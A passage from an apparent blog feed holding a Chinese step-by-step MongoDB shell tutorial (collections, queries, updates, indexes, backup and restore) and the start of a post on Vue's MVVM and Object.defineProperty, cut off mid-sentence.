class="line">&gt; use komablog;</span><br><span class="line">&gt; show collections;</span><br><span class="line">&gt; db.createCollection(<span class="string">&quot;users&quot;</span>);</span><br><span class="line">&gt; show collections;</span><br><span class="line">&gt; db.users.renameCollection(<span class="string">&quot;staff&quot;</span>); // <span class="built_in">users</span> -&gt; staff</span><br><span class="line">&gt; show collections;</span><br><span class="line">&gt; db.staff.drop();</span><br><span class="line">&gt; show collections;</span><br><span class="line">&gt; db.dropDatabase();</span><br><span class="line">&gt; show dbs;</span><br></pre></td></tr></table></figure><h1 id="4-操作文档（Document）"><a href="#4-操作文档（Document）" class="headerlink" title="4. 操作文档（Document）"></a>4. 操作文档（Document）</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul><li>MongoDB数据文档的操作</li></ul><h2 id="实战演习-2"><a href="#实战演习-2" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; show collections;</span><br><span class="line">&gt; db.createCollection(<span class="string">&quot;posts&quot;</span>);</span><br><span class="line">&gt; db.posts.insert(</span><br><span class="line">... &#123;</span><br><span class="line">...     title: <span class="string">&quot;我的第一篇博客&quot;</span>,</span><br><span class="line">...     content: <span class="string">&quot;已经开始写博客了，太激动了。&quot;</span></span><br><span class="line">... &#125;</span><br><span class="line">... );</span><br><span class="line">&gt; show collections;</span><br><span class="line">&gt; db.posts.find();</span><br><span class="line">&gt; db.posts.insert(</span><br><span class="line">... &#123;</span><br><span class="line">...     title: <span class="string">&quot;我的第二篇博客&quot;</span>,</span><br><span class="line">...     content: <span class="string">&quot;写点什么好呢？&quot;</span>,</span><br><span class="line">...     tag: [<span class="string">&quot;未分类&quot;</span>]</span><br><span class="line">... &#125;</span><br><span class="line">... );</span><br><span class="line">&gt; db.posts.find();</span><br><span class="line">&gt; <span class="keyword">for</span>(var i = 3; i &lt;=10; i++ ) &#123;</span><br><span class="line">...     db.posts.insert(&#123;</span><br><span class="line">...         title: <span class="string">&quot;我的第&quot;</span> + i + <span class="string">&quot;篇博客&quot;</span></span><br><span class="line">...     &#125;);</span><br><span class="line">... &#125;</span><br><span class="line">&gt; db.posts.find();</span><br><span class="line">&gt; db.posts.count();</span><br><span class="line">&gt; db.posts.remove(&#123;&#125;); // 大括号内的是数据字段的匹配条件，如果留空会删除所有的数据</span><br><span class="line">&gt; db.posts.count();</span><br><span class="line">&gt; db.posts.find();</span><br></pre></td></tr></table></figure><h1 id="5-带条件的文档"><a href="#5-带条件的文档" class="headerlink" title="5. 带条件的文档"></a>5. 带条件的文档</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul><li>db.[collection_name].find({“”:””})</li><li>$gte (&gt;=) , $gt (&gt;) , $lte (&lt;=) , $lt (&lt;)</li><li>$eq (=) , $ne (!=)</li><li>正则表达式:/k/, /^k/</li><li>db.[collection_name].distinct(“field_name”);</li></ul><h2 id="实战演习-3"><a href="#实战演习-3" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; db.posts.remove(&#123;&#125;);</span><br><span class="line">&gt; db.posts.insert(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>,<span class="string">&quot;rank&quot;</span>:2,<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;game&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.insert(&#123;title:<span class="string">&quot;纸片马里奥试玩体验&quot;</span>,<span class="string">&quot;rank&quot;</span>:1,<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;game&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.insert(&#123;title:<span class="string">&quot;Utunbu16LTS的安装&quot;</span>,<span class="string">&quot;rank&quot;</span>:3,<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;it&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.insert(&#123;title:<span class="string">&quot;信长之野望大志销量突破10000&quot;</span>,<span class="string">&quot;rank&quot;</span>:4,<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;game&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.insert(&#123;title:<span class="string">&quot;Ruby的开发效率真的很高吗&quot;</span>,<span class="string">&quot;rank&quot;</span>:7,<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;it&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.insert(&#123;title:<span class="string">&quot;塞尔达传说最近出了DLC&quot;</span>,<span class="string">&quot;rank&quot;</span>:4,<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;game&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;<span class="string">&quot;tag&quot;</span>: <span class="string">&quot;game&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;<span class="string">&quot;rank&quot;</span>: &#123;<span class="variable">$gte</span>: 4&#125;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;<span class="string">&quot;rank&quot;</span>: &#123;<span class="variable">$gt</span>: 4&#125;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;<span class="string">&quot;rank&quot;</span>: &#123;<span class="variable">$lte</span>: 4&#125;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;<span class="string">&quot;rank&quot;</span>: &#123;<span class="variable">$lt</span>: 4&#125;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;<span class="string">&quot;title&quot;</span>: /u/&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;<span class="string">&quot;title&quot;</span>: /^R/&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;<span class="string">&quot;title&quot;</span>: /^U/&#125;);</span><br><span class="line">&gt; db.posts.distinct(<span class="string">&quot;tag&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="6-复杂条件抽文档"><a href="#6-复杂条件抽文档" class="headerlink" title="6. 复杂条件抽文档"></a>6. 复杂条件抽文档</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul><li>且查询：db.[collection_name].find({ “”: “”, “”: “” })</li><li>或查询：db.[collection_name].find({ $or: [{…},{…}] });</li><li>某一字段存在多个可能数据：db.[collection_name].find({ “”: {$in: […]} });</li><li>获取是否存在某一字段的数据：db.[collection_name].find({ “”: {$exists: true} });</li></ul><h2 id="实战演习-4"><a href="#实战演习-4" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; db.posts.find();</span><br><span class="line">&gt; db.posts.find(&#123; <span class="string">&quot;title&quot;</span>: /u/, <span class="string">&quot;rank&quot;</span>:&#123;<span class="variable">$gte</span>:5&#125; &#125;);</span><br><span class="line">&gt; db.posts.find(&#123; <span class="variable">$or</span>: [&#123;<span class="string">&quot;title&quot;</span>: /u/&#125;, &#123;<span class="string">&quot;rank&quot;</span>:&#123;<span class="variable">$gte</span>:4&#125;&#125;] &#125;);</span><br><span class="line">&gt; db.posts.find(&#123; <span class="string">&quot;rank&quot;</span>: &#123;<span class="variable">$in</span>: [3,4]&#125; &#125;);</span><br><span class="line">&gt; db.posts.insert(&#123; <span class="string">&quot;title&quot;</span>:<span class="string">&quot;惊！骑士发生重大交易&quot;</span>, <span class="string">&quot;istop&quot;</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&gt; db.posts.find(&#123; <span class="string">&quot;istop&quot;</span>: &#123;<span class="variable">$exists</span>: <span class="literal">true</span>&#125; &#125;);</span><br></pre></td></tr></table></figure><h1 id="7-指定抽出字段"><a href="#7-指定抽出字段" class="headerlink" title="7. 指定抽出字段"></a>7. 指定抽出字段</h1><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul><li>db.[collection_name].find({}, {field1: true, field2: 1})</li></ul><h2 id="实战演习-5"><a href="#实战演习-5" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; db.posts.find();</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;title:<span class="literal">true</span>, rank:1&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;title:<span class="literal">true</span>, rank:1, _id:0&#125;);</span><br></pre></td></tr></table></figure><h1 id="8-文档的方法"><a href="#8-文档的方法" class="headerlink" title="8. 文档的方法"></a>8. 文档的方法</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul><li>排序：sort()<ul><li><code>sort(&#123;rank:1&#125;)</code> 进行升序排序</li><li><code>sort(&#123;rank:-1&#125;)</code> 进行降序排序</li></ul></li><li>限制：limit([Number])<ul><li>抽取查询结果的前[Number]条数据</li><li>使用 <code>findOne()</code> 代替 <code>find()</code> 可以查询首条记录</li></ul></li><li>跳过：skip([Number])<ul><li>跳过前[Number]条数据</li><li>与 <code>limit()</code> 配合使用可以实现分页</li></ul></li></ul><h2 id="实战演习-6"><a href="#实战演习-6" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; db.posts.find();</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;).<span class="built_in">sort</span>(&#123;rank:1&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;).<span class="built_in">sort</span>(&#123;rank:-1&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;).<span class="built_in">limit</span>(3);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;).<span class="built_in">sort</span>(&#123;rank:-1&#125;).<span class="built_in">limit</span>(3);</span><br><span class="line">&gt; db.posts.findOne(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;).<span class="built_in">limit</span>(3);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;).skip(3).<span class="built_in">limit</span>(3);</span><br></pre></td></tr></table></figure><h1 id="9-文档更新（update）"><a href="#9-文档更新（update）" class="headerlink" title="9. 文档更新（update）"></a>9. 文档更新（update）</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul><li>update(&lt;filter&gt;, &lt;update&gt;, &lt;options&gt;)<ul><li>使用 <code>$set</code> 来设置新值。</li><li>如果过滤出多条数据后使用 <code>$set</code> 设置新值，在Mongodb中会只更新过滤出的第一条选项。使用设置选项 <code>multi: true</code> 可以更新过滤出的所有数据。·</li><li>如果不使用 <code>$set</code> 在 <code>&lt;update&gt;</code> 中直接填写一个JSON格式的数据字段，那么Mongodb会删除原来文档的所有数据，将文档更新为新传入的数据。</li></ul></li></ul><h3 id="命令参考网页"><a href="#命令参考网页" class="headerlink" title="命令参考网页"></a>命令参考网页</h3><p><a href="https://docs.mongodb.com/manual/reference/method/db.collection.update">https://docs.mongodb.com/manual/reference/method/db.collection.update</a></p><h2 id="实战演习-7"><a href="#实战演习-7" class="headerlink" title="实战演习"></a>实战演习</h2><blockquote><p>更新数据的key值必须用 <code>&quot;&quot;</code> 包裹</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; db.posts.findOne(&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.update(&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;<span class="variable">$set</span>: &#123;<span class="string">&quot;rank&quot;</span>: 10&#125; &#125;);</span><br><span class="line">&gt; db.posts.find();</span><br><span class="line">&gt; db.posts.update(&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;<span class="string">&quot;rank&quot;</span>: 99&#125;);</span><br><span class="line">&gt; db.posts.find();</span><br><span class="line">&gt; db.posts.update(&#123;<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;it&quot;</span>&#125;, &#123;<span class="variable">$set</span>: &#123;<span class="string">&quot;rank&quot;</span>: 50&#125;&#125;);</span><br><span class="line">&gt; db.posts.find();</span><br><span class="line">&gt; db.posts.update(&#123;<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;it&quot;</span>&#125;, &#123;<span class="variable">$set</span>: &#123;<span class="string">&quot;rank&quot;</span>: 60&#125;&#125;, &#123;multi: <span class="literal">true</span>&#125;);</span><br><span class="line">&gt; db.posts.find();</span><br></pre></td></tr></table></figure><h1 id="10-玩几个特殊函数"><a href="#10-玩几个特殊函数" class="headerlink" title="10. 玩几个特殊函数"></a>10. 玩几个特殊函数</h1><p>今天为您讲几个操作文档字段的函数。</p><blockquote><p>只要开头为 <code>$</code> 的都是特殊函数</p></blockquote><h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul><li>$inc: 递加</li><li>$mul: 相乘</li><li>$rename: 修改字段名</li><li>$set: 新增or修改字段</li><li>$unset: 字段删除</li></ul><h2 id="实战演习-8"><a href="#实战演习-8" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; db.posts.find(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.update(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;<span class="variable">$inc</span>: &#123;rank: 1&#125;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.update(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;<span class="variable">$mul</span>: &#123;rank: 2&#125;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.update(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;<span class="variable">$rename</span>: &#123;<span class="string">&quot;rank&quot;</span>: <span class="string">&quot;score&quot;</span>&#125;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.update(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;<span class="variable">$set</span>: &#123;<span class="string">&quot;istop&quot;</span>: <span class="literal">true</span>&#125;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.update(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;<span class="variable">$unset</span>: &#123;<span class="string">&quot;istop&quot;</span>: <span class="literal">true</span>&#125;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;, &#123;_id:0&#125;);</span><br></pre></td></tr></table></figure><h3 id="11-文档的特殊更新"><a href="#11-文档的特殊更新" class="headerlink" title="11. 文档的特殊更新"></a>11. 文档的特殊更新</h3><h2 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h2><ul><li>upsert:有则更新，无则追加<ul><li>配置选项</li></ul></li><li>remove:条件删除数据</li></ul><h2 id="实战演习-9"><a href="#实战演习-9" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.update(&#123;title:<span class="string">&quot;其实创造比大志好玩&quot;</span>&#125;, &#123;title:<span class="string">&quot;其实创造比大志好玩&quot;</span>, <span class="string">&quot;rank&quot;</span>:5,<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;game&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.update(&#123;title:<span class="string">&quot;其实创造比大志好玩&quot;</span>&#125;, &#123;title:<span class="string">&quot;其实创造比大志好玩&quot;</span>, <span class="string">&quot;rank&quot;</span>:5,<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;game&quot;</span>&#125;, &#123;upsert:<span class="literal">true</span>&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.update(&#123;title:<span class="string">&quot;其实创造比大志好玩&quot;</span>&#125;, &#123;title:<span class="string">&quot;其实创造比大志好玩&quot;</span>, <span class="string">&quot;rank&quot;</span>:7,<span class="string">&quot;tag&quot;</span>:<span class="string">&quot;game&quot;</span>&#125;, &#123;upsert:<span class="literal">true</span>&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.remove(&#123;title:<span class="string">&quot;其实创造比大志好玩&quot;</span>&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br></pre></td></tr></table></figure><h1 id="12-使用索引"><a href="#12-使用索引" class="headerlink" title="12. 使用索引"></a>12. 使用索引</h1><h2 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h2><ul><li>获取索引：getIndexes()</li><li>创建索引：createIndex({…}, {…})<ul><li>第一个参数填写索字段名，其value为 <code>1</code> 或 <code>-1</code> 代表该索引按照升序或者降序排序</li><li>第二个参数为可选项，填写 <code>&#123;unique: ture&#125;</code> 可以将该索引设置为unique索引</li></ul></li><li>删除索引：dropIndex({…})</li></ul><h2 id="实战演习-10"><a href="#实战演习-10" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; db.posts.getIndexes();</span><br><span class="line">&gt; db.posts.createIndex(&#123;rank:-1&#125;);</span><br><span class="line">&gt; db.posts.getIndexes();</span><br><span class="line">&gt; db.posts.dropIndex(&#123;rank:-1&#125;);</span><br><span class="line">&gt; db.posts.getIndexes();</span><br><span class="line">&gt; db.posts.createIndex(&#123;title:1&#125;, &#123;unique:<span class="literal">true</span>&#125;);</span><br><span class="line">&gt; db.posts.getIndexes();</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.insert(&#123;title:<span class="string">&quot;怪物猎人世界评测&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><h1 id="13-备份和恢复"><a href="#13-备份和恢复" class="headerlink" title="13. 备份和恢复"></a>13. 备份和恢复</h1><h2 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h2><blockquote><p><code>mongodump</code> 和 <code>mongorestore</code> 都是系统指令</p></blockquote><ul><li>备份：mongodump</li><li>恢复：mongorestore</li></ul><h2 id="实战演习-11"><a href="#实战演习-11" class="headerlink" title="实战演习"></a>实战演习</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; show dbs;</span><br><span class="line">&gt; use komablog;</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; <span class="built_in">exit</span></span><br><span class="line">$ <span class="built_in">mkdir</span> dbbak</span><br><span class="line">$ <span class="built_in">cd</span> dbbak</span><br><span class="line">$ mongodump -d komablog</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ mongo komablog</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; db.posts.remove(&#123;&#125;);</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; <span class="built_in">exit</span></span><br><span class="line">$ mongorestore --drop</span><br><span class="line">$ mongo komablog</span><br><span class="line">&gt; db.posts.find(&#123;&#125;, &#123;_id:0&#125;);</span><br><span class="line">&gt; <span class="built_in">exit</span></span><br><span class="line">$ mongodump --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><h1 id="14-来源声明"><a href="#14-来源声明" class="headerlink" title="14. 来源声明"></a>14. 来源声明</h1><h2 id="课程文件"><a href="#课程文件" class="headerlink" title="课程文件"></a>课程文件</h2><p><a href="https://gitee.com/komavideo/LearnMongoDB">https://gitee.com/komavideo/LearnMongoDB</a></p><h2 id="小马视频频道"><a href="#小马视频频道" class="headerlink" title="小马视频频道"></a>小马视频频道</h2><p><a href="http://komavideo.com">http://komavideo.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> DB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue中的MVVM实现原理简析</title>
      <link href="/2019/05/f8fafe36f461.html"/>
      <url>/2019/05/f8fafe36f461.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-MVVM"><a href="#1-MVVM" class="headerlink" title="1. MVVM"></a>1. MVVM</h1><p>angular - 脏值检测</p><p>vue - 数据劫持+发布订阅模式（不兼容低版本：因为其依赖于Object.defineProperty）</p><p>总体流程图：</p><p><img src="http://markdown.img.esunr.xyz/vue%E4%B8%ADMVVM%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B.png" alt=""></p><h1 id="2-Object-defineProperty"><a href="#2-Object-defineProperty" class="headerlink" title="2. Object.defineProperty()"></a>2. Object.defineProperty()</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p><code>Object.defineProperty()</code> 方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性， 并返回这个对象。定义的这个属性具有使用 <code>Object.defineProperty()</code> 为其附上的特性。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperty(obj, prop, descriptor)</span><br></pre></td></tr></table></figure><p><code>obj</code>：要在其上定义属性的对象。</p><p><code>prop</code>：要定义或修改的属性的名称。</p><p><code>descriptor</code>：将被定义或修改的属性描述符。</p><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">age</span>: <span class="number">18</span> &#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">&#x27;name&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">value</span>: <span class="string">&#x27;esunr&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; obj</span><br><span class="line">&lt; &#123; age: 18, name: &quot;esunr&quot; &#125;</span><br></pre></td></tr></table></figure><p>但是当我们使用 <code>delete obj.school;</code> 是无法删除属性的，为了实现删除 <code>obj</code> 的 <code>school</code> 属性，我们需要去使用属性修饰符：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  let obj = &#123;&#125;;</span><br><span class="line">  Object.defineProperty(obj, &#x27;school&#x27;, &#123;</span><br><span class="line"><span class="addition">+   configurable: true,</span></span><br><span class="line">    value: &#x27;esunr&#x27;</span><br><span class="line">  &#125;);</span><br><span class="line">  delete obj.school;</span><br><span class="line">  console.log(obj);</span><br></pre></td></tr></table></figure><p>但是不是使用 <code>Object.defineProperty()</code> 方法定义的对象属性，可以不受限制任意读写，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; obj.age = 19;</span><br><span class="line">&lt; 19</span><br><span class="line">&gt; obj</span><br><span class="line">&lt; &#123; age: 19, name: &quot;esunr&quot; &#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-属性修饰符"><a href="#1-2-属性修饰符" class="headerlink" title="1.2 属性修饰符"></a>1.2 属性修饰符</h2><p>在上面的代码中，<code>value</code>、<code>configurable</code> 都属于属性修饰符，使用 <code>Object.defineProperty</code> 时，我们要对每一个值都独立配置这些属性修饰符。</p><p><strong>数据描述符和存取描述符均具有</strong>以下可选键值：</p><p><code>configurable</code></p><p>当且仅当该属性的 configurable 为 true 时，该属性<code>描述符</code>才能够被改变，同时该属性也能从对应的对象上被删除。<strong>默认为 false</strong>。</p><p><code>enumerable</code></p><p>当且仅当该属性的<code>enumerable</code>为<code>true</code>时，该属性才能够出现在对象的枚举属性中。<strong>默认为 false</strong>。（默认不可使用 <code>for..in</code> 循环）</p><p><strong>数据描述符同时具有以下可选键值</strong>：</p><p><code>value</code></p><p>该属性对应的值。可以是任何有效的 JavaScript 值（数值，对象，函数等）。<strong>默认为 <code>undefined</code></strong>。</p><p><code>writable</code></p><p>当且仅当该属性的<code>writable</code>为<code>true</code>时，<code>value</code>才能被赋值运算符改变。<strong>默认为 false</strong>。</p><p><strong>存取描述符同时具有以下可选键值</strong>：</p><h2 id="1-3-get-与set"><a href="#1-3-get-与set" class="headerlink" title="1.3 get()与set()"></a>1.3 get()与set()</h2><p><code>get</code></p><p>一个给属性提供 getter 的方法，如果没有 getter 则为 